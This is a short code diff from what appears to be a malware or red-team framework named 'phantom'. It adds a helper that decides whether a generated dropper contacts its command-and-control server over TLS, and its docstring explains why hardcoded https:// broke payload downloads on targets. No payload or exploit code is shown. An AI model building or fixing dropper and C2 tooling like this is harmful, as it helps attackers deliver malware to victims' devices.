@@ -313,6 +313,34 @@ def get_c2_front() -> Optional[tuple]:
     return host, port, cfg.get_bool("c2.ssl", True, env="PHANTOM_C2_SSL")
 
 
+def c2_use_ssl() -> bool:
+    """Does the C2 the next dropper is built for speak TLS?
+
+    The LIVE listener is the authority when one is running: it is what the
+    target will actually reach. Without one, the declarative `c2.ssl`
+    (PHANTOM_C2_SSL) decides — the same setting `get_c2_front()` honours, and
+    the same default (on).
+
+    Builders used to pass `use_ssl=True` as a literal, so a dropper generated
+    against an HTTP listener still said `https://`: nothing downloaded, and
+    with a bounded retry loop the board spent its whole budget knocking on a
+    port that was never going to answer. `ssl` is configuration, not a
+    constant.
+    """
+    try:
+        from phantom.core.c2_server import server_instance
+        thread = getattr(server_instance, "thread", None)
+        if thread is not None and thread.is_alive():
+            return bool(server_instance.use_ssl)
+    except Exception:
+        pass
+    try:
+        from phantom.utils import config as cfg
+        return cfg.get_bool("c2.ssl", True, env="PHANTOM_C2_SSL")
+    except Exception:
+        return True
+
+
 def get_c2_front_cert() -> str:
     """Path to the TLS-terminating front's certificate, or "".
 
